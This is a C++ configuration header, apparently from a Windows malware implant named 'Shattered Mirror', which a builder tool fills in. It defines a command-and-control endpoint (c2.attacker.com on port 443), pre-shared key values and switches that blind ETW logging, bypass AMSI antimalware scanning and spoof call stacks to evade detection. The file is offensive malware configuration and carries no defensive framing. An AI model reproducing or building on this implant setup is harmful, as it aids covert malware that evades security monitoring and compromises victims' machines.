#pragma once
#include <windows.h>

/* 
 * SHATTERED MIRROR: DYNAMIC CONFIGURATION HEADER
 *
 * This file is automatically modified by the Builder GUI
 * to inject the specific C2 settings and PSK seeds.
 * Do not manually edit unless you are debugging.
 */

namespace Config {
    /* C2 ENDPOINT SETTINGS */
    static const char* C2_DOMAIN = "c2.attacker.com";
    static const int   C2_PORT   = 443;
    static const char* PSK_SEED = "SuperSecretSeedForClient001";
    static const char* PSK_ID     = "780t93RsjAyjYlNm";

    /* EVASION SETTINGS */
    static const bool ENABLE_ETW_BLIND = true;
    static const bool ENABLE_AMSI_BYPASS = true;
    static const bool ENABLE_STACK_SPOOF = true;

    /* DEBUG SETTINGS */
    static const bool ENABLE_DEBUG_CONSOLE = true;
    static const char* LOG_FILE_PATH = "shattered_debug.log";
}
